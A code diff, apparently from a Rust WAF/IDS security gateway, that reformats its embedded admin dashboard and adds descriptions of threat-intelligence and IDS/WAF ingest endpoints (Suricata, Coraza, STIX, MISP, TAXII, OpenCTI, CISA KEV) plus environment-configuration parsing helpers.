-    <section class="card"><h2>TAXII 2.1 collection poll</h2><p class="muted">POST admin-authenticated JSON to <code>/api/threat-intel/taxii/poll</code> with <code>objects_url</code> (or <code>api_root</code>+<code>collection_id</code>), optional Basic/Bearer credentials, and optional <code>added_after</code>. Fetches TAXII objects, normalizes to STIX, and upserts threats/DNSBL. Credentials are never written to audit logs.</p></section>
-    <section class="card"><h2>OpenCTI threat intelligence</h2><p class="muted">POST admin-authenticated OpenCTI GraphQL/list export JSON to <code>/api/threat-intel/opencti</code> (optional query: <code>feed_id</code>, <code>source</code>, <code>ttl_seconds</code>). Maps IPv4/IPv6, Domain-Name, Url, file hashes, and STIX indicators into threats/DNSBL. Live OpenCTI GraphQL pull is a follow-up.</p></section>
-    <section class="card"><h2>CISA KEV catalog</h2><p class="muted">POST admin-authenticated JSON to <code>/api/threat-intel/cisa-kev</code> with optional <code>feed_id</code>, <code>source</code>, and <code>ttl_seconds</code>. Fetches the deployment-configured CISA Known Exploited Vulnerabilities catalog URL (server-side config only, not part of this request) and upserts a <code>cve</code> threat indicator per entry (severity escalated to critical when CISA has tied the CVE to a known ransomware campaign).</p></section>
-    <section class="card" id="socLlmCard" hidden><h2>AI SOC analysis (LLM)</h2><p class="muted">Triage a recorded security event with the configured LLM (contextual-orchestrator).</p><div class="row"><input id="socEventId" class="hdr-input" type="number" min="1" placeholder="Event id" aria-label="Security event id to analyze"><button type="button" id="socAnalyzeBtn" class="btn-secondary">Analyze event</button></div><pre class="raw" id="socAnalysis" style="margin-top:8px;white-space:pre-wrap"></pre></section>
+    <section class="card"><h2>Suricata IDS ingest</h2>
+      <p class="muted">POST admin-authenticated Suricata EVE JSON/NDJSON alerts to <code>/api/ids/suricata/eve</code>. Alerts become SOC security events (no hand-rolled IDS rules).</p>
+    </section>
+    <section class="card"><h2>Coraza / OWASP CRS WAF ingest</h2>
+      <p class="muted">POST admin-authenticated Coraza audit JSON/NDJSON to <code>/api/waf/coraza/audit</code>. CRS rule matches become SOC events and block-grade hits also seed DNSBL/<code>client_ip</code> indicators so the gateway enforces subsequent requests (run Coraza outside; do not invent WAF rules here).</p>
+    </section>
+    <section class="card"><h2>STIX threat intelligence</h2>
+      <p class="muted">POST admin-authenticated STIX 2.x indicator or bundle JSON to <code>/api/threat-intel/stix</code> (optional query: <code>feed_id</code>, <code>source</code>, <code>ttl_seconds</code>). Maps ipv4/domain/url patterns into threats/DNSBL for gateway scoring.</p>
+    </section>
+    <section class="card"><h2>MISP threat intelligence</h2>
+      <p class="muted">POST admin-authenticated MISP Event/attribute JSON to <code>/api/threat-intel/misp</code> (optional query: <code>feed_id</code>, <code>source</code>, <code>ttl_seconds</code>). Maps IDS-worthy attributes (ip-src/ip-dst, domain, url, composites, hashes) into threats/DNSBL; attributes with <code>to_ids=false</code> are skipped. Live MISP REST pull is a follow-up.</p>
+    </section>
+    <section class="card"><h2>TAXII 2.1 collection poll</h2>
+      <p class="muted">POST admin-authenticated JSON to <code>/api/threat-intel/taxii/poll</code> with <code>objects_url</code> (or <code>api_root</code>+<code>collection_id</code>), optional Basic/Bearer credentials, and optional <code>added_after</code>. Fetches TAXII objects, normalizes to STIX, and upserts threats/DNSBL. Credentials are never written to audit logs.</p>
+    </section>
+    <section class="card"><h2>OpenCTI threat intelligence</h2>
+      <p class="muted">POST admin-authenticated OpenCTI GraphQL/list export JSON to <code>/api/threat-intel/opencti</code> (optional query: <code>feed_id</code>, <code>source</code>, <code>ttl_seconds</code>). Maps IPv4/IPv6, Domain-Name, Url, file hashes, and STIX indicators into threats/DNSBL. Live OpenCTI GraphQL pull is a follow-up.</p>
+    </section>
+    <section class="card"><h2>CISA KEV catalog</h2>
+      <p class="muted">POST admin-authenticated JSON to <code>/api/threat-intel/cisa-kev</code> with optional <code>feed_id</code>, <code>source</code>, and <code>ttl_seconds</code>. Fetches the deployment-configured CISA Known Exploited Vulnerabilities catalog URL (server-side config only, not part of this request) and upserts a <code>cve</code> threat indicator per entry (severity escalated to critical when CISA has tied the CVE to a known ransomware campaign).</p>
+    </section>
+    <section class="card" id="socLlmCard" hidden><h2>AI SOC analysis (LLM)</h2>
+      <p class="muted">Triage a recorded security event with the configured LLM (contextual-orchestrator).</p>
+      <div class="row">
+        <input id="socEventId" class="hdr-input" type="number" min="1" placeholder="Event id" aria-label="Security event id to analyze">
+        <button type="button" id="socAnalyzeBtn" class="btn-secondary">Analyze event</button>
+      </div>
+      <pre class="raw" id="socAnalysis" style="margin-top:8px;white-space:pre-wrap"></pre>
+    </section>
     <section class="card" id="auditCard" aria-labelledby="auditHeading"><h2 id="auditHeading">Audit log</h2><div id="auditBody" class="muted">Loading…</div></section>
     <section class="card"><h2>Evidence manifest</h2><pre class="raw" id="manifest">Loading…</pre></section>
     <section class="card"><h2>SOC event export (ndjson)</h2><pre class="raw" id="export">Loading…</pre></section>
-    <section class="card" id="viewerCard" hidden><h2>Document viewer (Clearfolio)</h2><p class="muted">Render live SOC evidence in the Clearfolio document viewer.</p><div class="row"><button type="button" class="btn-secondary" data-doc="evidence-manifest">Open evidence manifest</button><button type="button" class="btn-secondary" data-doc="soc-export">Open SOC export</button></div><div id="viewerStatus" class="muted" style="margin-top:8px"></div><iframe id="viewerFrame" title="Clearfolio document viewer" hidden style="width:100%;height:70vh;border:1px solid var(--border);border-radius:var(--radius);margin-top:8px"></iframe></section>
+    <section class="card" id="viewerCard" hidden><h2>Document viewer (Clearfolio)</h2>
+      <p class="muted">Render live SOC evidence in the Clearfolio document viewer.</p>
+      <div class="row">
+        <button type="button" class="btn-secondary" data-doc="evidence-manifest">Open evidence manifest</button>
+        <button type="button" class="btn-secondary" data-doc="soc-export">Open SOC export</button>
+      </div>
+      <div id="viewerStatus" class="muted" style="margin-top:8px"></div>
+      <iframe id="viewerFrame" title="Clearfolio document viewer" hidden style="width:100%;height:70vh;border:1px solid var(--border);border-radius:var(--radius);margin-top:8px"></iframe>
+    </section>
     <section class="card"><h2>DNSBL zone</h2><pre class="raw" id="zone">Loading…</pre></section>
   </div>
 </main>
@@ -1680,91 +3118,4986 @@ function modeBadge(m){return badge(cap(m),String(m).toLowerCase()==='block'?'b-f
 function stateBadge(v){return v?badge('Enabled','b-pass'):badge('Disabled','b-neutral');}
 function statusBadge(s){const m={pass:'b-pass',fail:'b-fail',active:'b-pass',evaluation:'b-warn',unlicensed:'b-neutral',expired:'b-fail'};return badge(cap(s),m[String(s).toLowerCase()]||'b-neutral');}
 function mono(t){return '<span class="badge mono b-neutral">'+esc(t)+'</span>';}
-function table(capt,cols,rows){if(!rows.length)return '<p class="empty">No entries.</p>';return '<table><caption>'+esc(capt)+'</caption><thead><tr>'+cols.map(c=>'<th scope="col">'+esc(c)+'</th>').join('')+'</tr></thead><tbody>'+rows.map(r=>'<tr>'+r.map(c=>'<td>'+c+'</td>').join('')+'</tr>').join('')+'</tbody></table>';}
+function table(capt,cols,rows){
+  if(!rows.length)return '<p class="empty">No entries.</p>';
+  return '<table><caption>'+esc(capt)+'</caption><thead><tr>'+cols.map(c=>'<th scope="col">'+esc(c)+'</th>').join('')+'</tr></thead><tbody>'+
+    rows.map(r=>'<tr>'+r.map(c=>'<td>'+c+'</td>').join('')+'</tr>').join('')+'</tbody></table>';
+}
 function toast(msg,ok){const d=document.createElement('div');d.className='toast '+(ok?'ok':'bad');d.textContent=msg;$('toast').appendChild(d);setTimeout(()=>d.remove(),4500);}
 async function guard(id,fn){try{await fn();}catch(e){$(id).innerHTML='<p class="err">Error: '+esc(e.message)+'</p>';}}
-async function loadKpis(){const k=await getJSON('/api/kpis');const t=[['Routes',k.route_count],['Threat indicators',k.threat_indicator_count],['DNSBL entries',k.dnsbl_entry_count],['Blocked events',k.blocked_event_count],['Monitor events',k.monitor_event_count],['Gateway mode',cap(k.gateway_mode)]];$('kpis').innerHTML=t.map(([l,v])=>'<div class="tile"><div class="label">'+esc(l)+'</div><div class="metric">'+esc(v)+'</div></div>').join('');}
-async function loadRoutes(){const d=await getJSON('/api/routes');$('routesBody').innerHTML=table('Configured routes',['Path prefix','Upstream','Mode','State'],d.map(r=>[esc(r.path_prefix),esc(r.upstream),modeBadge(r.mode),stateBadge(r.enabled)]));}
-async function loadThreats(){const d=await getJSON('/api/threats');$('threatsBody').innerHTML=table('Threat indicators',['Value','Type','Severity','Source','TTL'],d.map(t=>[mono(t.value),esc(t.indicator_type),sevBadge(t.severity),esc(t.source),esc(t.ttl_seconds)+'s']));}
-async function loadDnsbl(){const d=await getJSON('/api/dnsbl');$('dnsblBody').innerHTML=table('DNSBL entries',['Address','Code','Reason','Source','TTL'],d.map(x=>[esc(x.address),mono(x.code),esc(x.reason),esc(x.source),esc(x.ttl_seconds)+'s']));}
-async function loadLicense(){const c=await getJSON('/api/commercial/license');$('licenseBody').innerHTML='<dl class="def">'+[['tenant_id',esc(c.tenant_id)],['deployment_id',esc(c.deployment_id)],['edition',badge(cap(c.edition),'b-brand')],['license_status',statusBadge(c.license_status)],['licensee',esc(c.licensee??'—')],['support_contact',esc(c.support_contact)],['ACV (KRW)',c.annual_contract_value_krw!=null?esc(c.annual_contract_value_krw):'—']].map(([k,v])=>'<dt>'+esc(k)+'</dt><dd>'+v+'</dd>').join('')+'</dl>';}
-async function loadReadiness(){const r=await getJSON('/api/commercial/readiness');const head='<div class="row" style="margin-bottom:10px">'+badge(r.ready_for_enterprise_sale?'Ready':'Not ready',r.ready_for_enterprise_sale?'b-pass':'b-warn')+'<span class="muted">'+esc(r.readiness_level)+'</span></div>';const checks=(r.checks||[]).map(c=>'<div class="row" style="margin:6px 0">'+statusBadge(c.status)+'<span class="muted">'+esc(c.id)+' — '+esc(c.evidence)+'</span></div>').join('');$('readinessBody').innerHTML=head+checks;}
-async function loadFeeds(){const f=await getJSON('/api/threat-feeds/freshness');$('feedsBody').innerHTML=table('Threat feeds',['Feed','Source','Threats','DNSBL','Freshness'],f.map(x=>[esc(x.feed_id),esc(x.source),esc(x.threat_count),esc(x.dnsbl_count),x.stale?badge('Stale','b-fail'):badge('Fresh','b-pass')]));}
-async function loadEvents(){const e=await getJSON('/api/events');$('eventsBody').innerHTML=table('Recent events',['ID','Client IP','Action','Score','Path'],e.slice(0,25).map(x=>[esc(x.id),esc(x.client_ip??'—'),esc(x.action),esc(x.score),esc(x.path)]));}
-async function loadAudit(){const t=($('adminToken').value||'').trim();const h=t?{'x-admin-token':t}:{};const r=await fetch('/api/audit-logs',{headers:h});if(!r.ok){let m=r.statusText;try{m=(await r.json()).error||m;}catch(e){}throw new Error(m);}const a=await r.json();$('auditBody').innerHTML=table('Audit log',['Actor','Action','Resource','Resource ID','Outcome'],a.slice(0,25).map(x=>[esc(x.actor),esc(x.action),esc(x.resource),esc(x.resource_id),esc(x.outcome)]));}
+async function loadKpis(){const k=await getJSON('/api/kpis');
+  const t=[['Routes',k.route_count],['Threat indicators',k.threat_indicator_count],['DNSBL entries',k.dnsbl_entry_count],['Blocked events',k.blocked_event_count],['Monitor events',k.monitor_event_count],['Gateway mode',cap(k.gateway_mode)]];
+  $('kpis').innerHTML=t.map(([l,v])=>'<div class="tile"><div class="label">'+esc(l)+'</div><div class="metric">'+esc(v)+'</div></div>').join('');}
+async function loadRoutes(){const d=await getJSON('/api/routes');
+  $('routesBody').innerHTML=table('Configured routes',['Path prefix','Upstream','Mode','State'],d.map(r=>[esc(r.path_prefix),esc(r.upstream),modeBadge(r.mode),stateBadge(r.enabled)]));}
+async function loadThreats(){const d=await getJSON('/api/threats');
+  $('threatsBody').innerHTML=table('Threat indicators',['Value','Type','Severity','Source','TTL'],d.map(t=>[mono(t.value),esc(t.indicator_type),sevBadge(t.severity),esc(t.source),esc(t.ttl_seconds)+'s']));}
+async function loadDnsbl(){const d=await getJSON('/api/dnsbl');
+  $('dnsblBody').innerHTML=table('DNSBL entries',['Address','Code','Reason','Source','TTL'],d.map(x=>[esc(x.address),mono(x.code),esc(x.reason),esc(x.source),esc(x.ttl_seconds)+'s']));}
+async function loadLicense(){const c=await getJSON('/api/commercial/license');
+  $('licenseBody').innerHTML='<dl class="def">'+
+    [['tenant_id',esc(c.tenant_id)],['deployment_id',esc(c.deployment_id)],['edition',badge(cap(c.edition),'b-brand')],['license_status',statusBadge(c.license_status)],['licensee',esc(c.licensee??'—')],['support_contact',esc(c.support_contact)],['ACV (KRW)',c.annual_contract_value_krw!=null?esc(c.annual_contract_value_krw):'—']]
+    .map(([k,v])=>'<dt>'+esc(k)+'</dt><dd>'+v+'</dd>').join('')+'</dl>';}
+async function loadReadiness(){const r=await getJSON('/api/commercial/readiness');
+  const head='<div class="row" style="margin-bottom:10px">'+badge(r.ready_for_enterprise_sale?'Ready':'Not ready',r.ready_for_enterprise_sale?'b-pass':'b-warn')+'<span class="muted">'+esc(r.readiness_level)+'</span></div>';
+  const checks=(r.checks||[]).map(c=>'<div class="row" style="margin:6px 0">'+statusBadge(c.status)+'<span class="muted">'+esc(c.id)+' — '+esc(c.evidence)+'</span></div>').join('');
+  $('readinessBody').innerHTML=head+checks;}
+async function loadFeeds(){const f=await getJSON('/api/threat-feeds/freshness');
+  $('feedsBody').innerHTML=table('Threat feeds',['Feed','Source','Threats','DNSBL','Freshness'],f.map(x=>[esc(x.feed_id),esc(x.source),esc(x.threat_count),esc(x.dnsbl_count),x.stale?badge('Stale','b-fail'):badge('Fresh','b-pass')]));}
+async function loadEvents(){const e=await getJSON('/api/events');
+  $('eventsBody').innerHTML=table('Recent events',['ID','Client IP','Action','Score','Path'],e.slice(0,25).map(x=>[esc(x.id),esc(x.client_ip??'—'),esc(x.action),esc(x.score),esc(x.path)]));}
+async function loadAudit(){
+  const t=($('adminToken').value||'').trim();
+  const h=t?{'x-admin-token':t}:{};
+  const r=await fetch('/api/audit-logs',{headers:h});
+  if(!r.ok){let m=r.statusText;try{m=(await r.json()).error||m;}catch(e){}throw new Error(m);}
+  const a=await r.json();
+  $('auditBody').innerHTML=table('Audit log',['Actor','Action','Resource','Resource ID','Outcome'],a.slice(0,25).map(x=>[esc(x.actor),esc(x.action),esc(x.resource),esc(x.resource_id),esc(x.outcome)]));
+}
 async function loadRaw(id,url,json){try{const t=json?JSON.stringify(await getJSON(url),null,2):await getText(url);$(id).textContent=t&&t.trim()?t:'(empty)';}catch(e){$(id).textContent='Error: '+e.message;}}
-async function refresh(){await Promise.allSettled([guard('kpis',loadKpis),guard('routesBody',loadRoutes),guard('threatsBody',loadThreats),guard('dnsblBody',loadDnsbl),guard('licenseBody',loadLicense),guard('readinessBody',loadReadiness),guard('feedsBody',loadFeeds),guard('eventsBody',loadEvents),guard('auditBody',loadAudit),loadRaw('manifest','/api/commercial/evidence-manifest',true),loadRaw('export','/api/events.ndjson',false),loadRaw('zone','/dnsbl/zone',false)]);}
-function wireCreate(formId,buildBody,onOk){const f=$(formId);if(!f)return;f.addEventListener('submit',async ev=>{ev.preventDefault();let body;try{body=buildBody(new FormData(f));}catch(e){toast(e.message,false);return;}const token=($('adminToken').value||'').trim();const h={'content-type':'application/json'};if(token)h['x-admin-token']=token;try{const r=await fetch(f.dataset.url,{method:'POST',headers:h,body:JSON.stringify(body)});if(!r.ok){let m=r.statusText;try{m=(await r.json()).error||m;}catch(e){}throw new Error(m);}toast(f.dataset.ok+' saved',true);f.reset();onOk();}catch(e){toast('Save failed: '+e.message,false);}});}
+async function refresh(){await Promise.allSettled([
+  guard('kpis',loadKpis),guard('routesBody',loadRoutes),guard('threatsBody',loadThreats),guard('dnsblBody',loadDnsbl),
+  guard('licenseBody',loadLicense),guard('readinessBody',loadReadiness),guard('feedsBody',loadFeeds),
+  guard('eventsBody',loadEvents),guard('auditBody',loadAudit),
+  loadRaw('manifest','/api/commercial/evidence-manifest',true),loadRaw('export','/api/events.ndjson',false),loadRaw('zone','/dnsbl/zone',false)]);}
+function wireCreate(formId,buildBody,onOk){const f=$(formId);if(!f)return;
+  f.addEventListener('submit',async ev=>{ev.preventDefault();let body;try{body=buildBody(new FormData(f));}catch(e){toast(e.message,false);return;}
+    const token=($('adminToken').value||'').trim();const h={'content-type':'application/json'};if(token)h['x-admin-token']=token;
+    try{const r=await fetch(f.dataset.url,{method:'POST',headers:h,body:JSON.stringify(body)});
+      if(!r.ok){let m=r.statusText;try{m=(await r.json()).error||m;}catch(e){}throw new Error(m);}
+      toast(f.dataset.ok+' saved',true);f.reset();onOk();
+    }catch(e){toast('Save failed: '+e.message,false);}});}
 const num=v=>{const n=parseInt(v,10);return Number.isFinite(n)?n:0;};
 wireCreate('routeForm',fd=>{const pp=(fd.get('path_prefix')||'').trim();return {id:pp.replace(/^\//,'').replace(/[^a-zA-Z0-9_-]/g,'-')||'route',path_prefix:pp,upstream:(fd.get('upstream')||'').trim(),mode:fd.get('mode'),enabled:fd.get('enabled')==='on'};},()=>{guard('routesBody',loadRoutes);guard('kpis',loadKpis);});
 wireCreate('threatForm',fd=>({value:(fd.get('value')||'').trim(),indicator_type:(fd.get('indicator_type')||'').trim(),severity:fd.get('severity'),source:(fd.get('source')||'').trim(),ttl_seconds:num(fd.get('ttl_seconds'))}),()=>{guard('threatsBody',loadThreats);guard('kpis',loadKpis);});
 wireCreate('dnsblForm',fd=>({address:(fd.get('address')||'').trim(),code:(fd.get('code')||'').trim(),reason:(fd.get('reason')||'').trim(),source:(fd.get('source')||'').trim(),ttl_seconds:num(fd.get('ttl_seconds'))}),()=>{guard('dnsblBody',loadDnsbl);guard('kpis',loadKpis);loadRaw('zone','/dnsbl/zone',false);});
 wireCreate('licenseForm',fd=>{const feats=(fd.get('features')||'').split(',').map(s=>s.trim()).filter(Boolean);const b={tenant_id:(fd.get('tenant_id')||'').trim(),deployment_id:(fd.get('deployment_id')||'').trim(),edition:fd.get('edition'),license_status:fd.get('license_status'),support_contact:(fd.get('support_contact')||'').trim(),features:feats};const lic=(fd.get('licensee')||'').trim();if(lic)b.licensee=lic;const lid=(fd.get('license_id')||'').trim();if(lid)b.license_id=lid;return b;},()=>{guard('licenseBody',loadLicense);guard('readinessBody',loadReadiness);});
-const root=document.documentElement;if(localStorage.getItem('waf-theme')==='hc')root.dataset.theme='hc';function syncHc(){$('hcToggle').setAttribute('aria-pressed',root.dataset.theme==='hc'?'true':'false');}syncHc();$('hcToggle').addEventListener('click',()=>{const on=root.dataset.theme==='hc';if(on){delete root.dataset.theme;}else{root.dataset.theme='hc';}localStorage.setItem('waf-theme',on?'':'hc');syncHc();});$('refreshBtn').addEventListener('click',refresh);
+const root=document.documentElement;
+if(localStorage.getItem('waf-theme')==='hc')root.dataset.theme='hc';
+function syncHc(){$('hcToggle').setAttribute('aria-pressed',root.dataset.theme==='hc'?'true':'false');}
+syncHc();
+$('hcToggle').addEventListener('click',()=>{const on=root.dataset.theme==='hc';if(on){delete root.dataset.theme;}else{root.dataset.theme='hc';}localStorage.setItem('waf-theme',on?'':'hc');syncHc();});
+$('refreshBtn').addEventListener('click',refresh);
 function cfHeaders(){const t=($('adminToken').value||'').trim();return t?{'x-admin-token':t}:{};}
-async function pollClearfolio(id){for(let i=0;i<40;i++){const r=await fetch('/api/clearfolio/jobs/'+encodeURIComponent(id),{headers:cfHeaders()});if(r.ok){const j=await r.json();const s=String(j.status||'').toUpperCase();const doc=j.docId||j.doc_id;if(s==='SUCCEEDED'||doc)return doc||id;if(s==='FAILED'||j.deadLettered)throw new Error('conversion failed');}await new Promise(res=>setTimeout(res,1500));}throw new Error('conversion timed out');}
-async function openClearfolioDoc(kind,base){const st=$('viewerStatus'),frame=$('viewerFrame');frame.hidden=true;st.textContent='Submitting conversion…';try{const sr=await fetch('/api/clearfolio/documents/'+encodeURIComponent(kind),{method:'POST',headers:cfHeaders()});if(!sr.ok)throw new Error((await sr.json().catch(()=>({}))).error||sr.statusText);const job=await sr.json();const id=job.jobId||job.job_id;if(!id)throw new Error('no job id returned');st.textContent='Converting… (job '+id+')';const doc=await pollClearfolio(id);frame.src=base.replace(/\/+$/,'')+'/viewer/'+encodeURIComponent(doc);frame.hidden=false;st.textContent='Document ready.';}catch(e){st.innerHTML='<span class="err">Viewer error: '+esc(e.message)+'</span>';}}
-async function initClearfolio(){let cfg;try{cfg=await getJSON('/api/clearfolio/config');}catch(e){return;}if(!cfg||!cfg.enabled||!cfg.base_url)return;const card=$('viewerCard');if(!card)return;card.hidden=false;card.querySelectorAll('button[data-doc]').forEach(b=>b.addEventListener('click',()=>openClearfolioDoc(b.dataset.doc,cfg.base_url)));}
-async function analyzeSocEvent(){const out=$('socAnalysis');const id=parseInt(($('socEventId').value||'').trim(),10);if(!Number.isFinite(id)||id<1){out.innerHTML='<span class="err">Enter a valid event id.</span>';return;}out.textContent='Analyzing…';try{const r=await fetch('/api/soc/analyze',{method:'POST',headers:{'content-type':'application/json',...cfHeaders()},body:JSON.stringify({event_id:id})});if(!r.ok)throw new Error((await r.json().catch(()=>({}))).error||r.statusText);const j=await r.json();out.textContent=j.analysis||'(no analysis)';}catch(e){out.innerHTML='<span class="err">Analysis error: '+esc(e.message)+'</span>';}}
-async function initSocLlm(){let cfg;try{cfg=await getJSON('/api/soc/llm-config');}catch(e){return;}if(!cfg||!cfg.enabled)return;const card=$('socLlmCard');if(!card)return;card.hidden=false;$('socAnalyzeBtn').addEventListener('click',analyzeSocEvent);}
-refresh();initClearfolio();initSocLlm();
+async function pollClearfolio(id){
+  for(let i=0;i<40;i++){
+    const r=await fetch('/api/clearfolio/jobs/'+encodeURIComponent(id),{headers:cfHeaders()});
+    if(r.ok){const j=await r.json();const s=String(j.status||'').toUpperCase();const doc=j.docId||j.doc_id;
+      if(s==='SUCCEEDED'||doc)return doc||id;
+      if(s==='FAILED'||j.deadLettered)throw new Error('conversion failed');}
+    await new Promise(res=>setTimeout(res,1500));}
+  throw new Error('conversion timed out');}
+async function openClearfolioDoc(kind,base){
+  const st=$('viewerStatus'),frame=$('viewerFrame');frame.hidden=true;st.textContent='Submitting conversion…';
+  try{
+    const sr=await fetch('/api/clearfolio/documents/'+encodeURIComponent(kind),{method:'POST',headers:cfHeaders()});
+    if(!sr.ok)throw new Error((await sr.json().catch(()=>({}))).error||sr.statusText);
+    const job=await sr.json();const id=job.jobId||job.job_id;if(!id)throw new Error('no job id returned');
+    st.textContent='Converting… (job '+id+')';
+    const doc=await pollClearfolio(id);
+    frame.src=base.replace(/\/+$/,'')+'/viewer/'+encodeURIComponent(doc);frame.hidden=false;st.textContent='Document ready.';
+  }catch(e){st.innerHTML='<span class="err">Viewer error: '+esc(e.message)+'</span>';}}
+async function initClearfolio(){
+  let cfg;try{cfg=await getJSON('/api/clearfolio/config');}catch(e){return;}
+  if(!cfg||!cfg.enabled||!cfg.base_url)return;
+  const card=$('viewerCard');if(!card)return;card.hidden=false;
+  card.querySelectorAll('button[data-doc]').forEach(b=>b.addEventListener('click',()=>openClearfolioDoc(b.dataset.doc,cfg.base_url)));}
+async function analyzeSocEvent(){
+  const out=$('socAnalysis');const id=parseInt(($('socEventId').value||'').trim(),10);
+  if(!Number.isFinite(id)||id<1){out.innerHTML='<span class="err">Enter a valid event id.</span>';return;}
+  out.textContent='Analyzing…';
+  try{
+    const r=await fetch('/api/soc/analyze',{method:'POST',headers:{'content-type':'application/json',...cfHeaders()},body:JSON.stringify({event_id:id})});
+    if(!r.ok)throw new Error((await r.json().catch(()=>({}))).error||r.statusText);
+    const j=await r.json();out.textContent=j.analysis||'(no analysis)';
+  }catch(e){out.innerHTML='<span class="err">Analysis error: '+esc(e.message)+'</span>';}}
+async function initSocLlm(){
+  let cfg;try{cfg=await getJSON('/api/soc/llm-config');}catch(e){return;}
+  if(!cfg||!cfg.enabled)return;
+  const card=$('socLlmCard');if(!card)return;card.hidden=false;
+  $('socAnalyzeBtn').addEventListener('click',analyzeSocEvent);}
+refresh();
+initClearfolio();
+initSocLlm();
 </script>
 </body>
 </html>"##;
 
+/// Parse the `EVENT_LIMIT` value (already read from the environment as an
+/// optional string). Absent falls back to [`AppConfig::DEFAULT_EVENT_LIMIT`]; a
+/// non-integer or zero value is a hard configuration error. Kept in the library
+/// (rather than the binary) so it is exercised by unit tests.
 pub fn parse_event_limit(raw: Option<&str>) -> Result<usize, Box<dyn std::error::Error>> {
-    let value = match raw { Some(raw) => raw.parse::<usize>().map_err(|error| std::io::Error::new(std::io::ErrorKind::InvalidInput, format!("EVENT_LIMIT must be a positive integer, got {raw:?}: {error}")))?, None => AppConfig::DEFAULT_EVENT_LIMIT };
-    if value == 0 { return Err(std::io::Error::new(std::io::ErrorKind::InvalidInput, "EVENT_LIMIT must be greater than 0").into()); }
+    let value = match raw {
+        Some(raw) => raw.parse::<usize>().map_err(|error| {
+            std::io::Error::new(
+                std::io::ErrorKind::InvalidInput,
+                format!("EVENT_LIMIT must be a positive integer, got {raw:?}: {error}"),
+            )
+        })?,
+        None => AppConfig::DEFAULT_EVENT_LIMIT,
+    };
+    if value == 0 {
+        return Err(std::io::Error::new(
+            std::io::ErrorKind::InvalidInput,
+            "EVENT_LIMIT must be greater than 0",
+        )
+        .into());
+    }
     Ok(value)
 }
 
-pub fn parse_u32_env(name: &str, raw: Option<&str>, default: u32) -> Result<u32, Box<dyn std::error::Error>> { match raw { Some(raw) => Ok(raw.parse::<u32>().map_err(|error| std::io::Error::new(std::io::ErrorKind::InvalidInput, format!("{name} must be a non-negative integer, got {raw:?}: {error}")))?), None => Ok(default) } }
-pub fn parse_u64_env(name: &str, raw: Option<&str>, default: u64) -> Result<u64, Box<dyn std::error::Error>> { match raw { Some(raw) => Ok(raw.parse::<u64>().map_err(|error| std::io::Error::new(std::io::ErrorKind::InvalidInput, format!("{name} must be a positive integer, got {raw:?}: {error}")))?), None => Ok(default) } }
+/// Parse a `u32` environment value (already read as an optional string),
+/// returning `default` when absent and a configuration error when malformed.
+pub fn parse_u32_env(
+    name: &str,
+    raw: Option<&str>,
+    default: u32,
+) -> Result<u32, Box<dyn std::error::Error>> {
+    match raw {
+        Some(raw) => Ok(raw.parse::<u32>().map_err(|error| {
+            std::io::Error::new(
+                std::io::ErrorKind::InvalidInput,
+                format!("{name} must be a non-negative integer, got {raw:?}: {error}"),
+            )
+        })?),
+        None => Ok(default),
+    }
+}
 
-pub async fn run_from_env(shutdown: std::pin::Pin<Box<dyn std::future::Future<Output = ()> + Send>>) -> Result<(), Box<dyn std::error::Error>> {
+/// Parse a `u64` environment value (already read as an optional string),
+/// returning `default` when absent and a configuration error when malformed.
+pub fn parse_u64_env(
+    name: &str,
+    raw: Option<&str>,
+    default: u64,
+) -> Result<u64, Box<dyn std::error::Error>> {
+    match raw {
+        Some(raw) => Ok(raw.parse::<u64>().map_err(|error| {
+            std::io::Error::new(
+                std::io::ErrorKind::InvalidInput,
+                format!("{name} must be a positive integer, got {raw:?}: {error}"),
+            )
+        })?),
+        None => Ok(default),
+    }
+}
+
+/// Read gateway configuration from the process environment, bind the listener,
+/// and serve until `shutdown` resolves. The binary entrypoint is a thin shim
+/// over this function so every branch is reachable from tests (the parse/error
+/// paths in-process, the bind/serve path via an ephemeral listener and an
+/// immediate shutdown).
+pub async fn run_from_env(
+    shutdown: std::pin::Pin<Box<dyn std::future::Future<Output = ()> + Send>>,
+) -> Result<(), Box<dyn std::error::Error>> {
     let bind_addr = std::env::var("BIND_ADDR").unwrap_or_else(|_| "127.0.0.1:8080".to_string());
-    let credentials_path = std::env::var("WAF_IDS_CREDENTIALS_PATH").ok().map(PathBuf::from);
-    let credentials = CredentialRegistry::bootstrap_secrets(credentials_path.as_deref(), std::env::var("ADMIN_TOKEN").ok(), std::env::var("ADMIN_TOKENS").ok())?;
-    let config = AppConfig { admin_token: credentials.get_credential(CRED_ADMIN_TOKEN).map(str::to_owned), state_path: std::env::var("WAF_IDS_STATE_PATH").ok().map(PathBuf::from), dnsbl_origin: std::env::var("DNSBL_ORIGIN").unwrap_or_else(|_| AppConfig::DEFAULT_DNSBL_ORIGIN.to_string()), event_limit: parse_event_limit(std::env::var("EVENT_LIMIT").ok().as_deref())? };
+    // Secret-bearing values go through the credential registry (env/file are
+    // bootstrap transports only). Operational config remains env for now.
+    let credentials_path = std::env::var("WAF_IDS_CREDENTIALS_PATH")
+        .ok()
+        .map(PathBuf::from);
+    let credentials = CredentialRegistry::bootstrap_secrets(
+        credentials_path.as_deref(),
+        std::env::var("ADMIN_TOKEN").ok(),
+        std::env::var("ADMIN_TOKENS").ok(),
+    )?;
+    let config = AppConfig {
+        admin_token: credentials
+            .get_credential(CRED_ADMIN_TOKEN)
+            .map(str::to_owned),
+        state_path: std::env::var("WAF_IDS_STATE_PATH").ok().map(PathBuf::from),
+        dnsbl_origin: std::env::var("DNSBL_ORIGIN")
+            .unwrap_or_else(|_| AppConfig::DEFAULT_DNSBL_ORIGIN.to_string()),
+        event_limit: parse_event_limit(std::env::var("EVENT_LIMIT").ok().as_deref())?,
+    };
     let rate_limit = parse_u32_env("RATE_LIMIT", std::env::var("RATE_LIMIT").ok().as_deref(), 0)?;
-    let rate_limit_window = parse_u64_env("RATE_LIMIT_WINDOW", std::env::var("RATE_LIMIT_WINDOW").ok().as_deref(), 60)?;
-    let admin_tokens = parse_admin_tokens(credentials.get_credential(CRED_ADMIN_TOKENS).unwrap_or_default());
-    let max_body_bytes = parse_u64_env("MAX_BODY_BYTES", std::env::var("MAX_BODY_BYTES").ok().as_deref(), 1_048_576)? as usize;
-    let listener = tokio::net::TcpListener::bind(&bind_addr).await?; let local_addr = listener.local_addr()?; println!("waf-ids-ai-soc listening on http://{local_addr}"); std::io::Write::flush(&mut std::io::stdout())?;
